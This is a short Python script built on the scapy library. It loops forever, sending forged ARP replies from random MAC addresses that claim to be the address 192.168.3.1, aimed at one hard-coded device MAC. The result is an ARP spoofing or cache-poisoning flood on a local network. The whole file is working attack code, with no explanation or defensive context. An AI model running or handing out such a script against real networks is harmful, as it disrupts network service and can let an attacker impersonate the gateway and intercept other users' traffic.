#! /usr/bin/python3

from scapy.all import *
while 1:
    rand_mac = RandMAC()
    rand_ip = RandIP()
    arp = ARP(hwsrc=rand_mac,psrc='192.168.3.1',op=2,hwdst='bc:d1:77:85:5c:94',pdst='192.168.3.1')
    ether = Ether(src=rand_mac,dst='bc:d1:77:85:5c:94')
    (ether/arp).show()
    sendp(ether/arp)
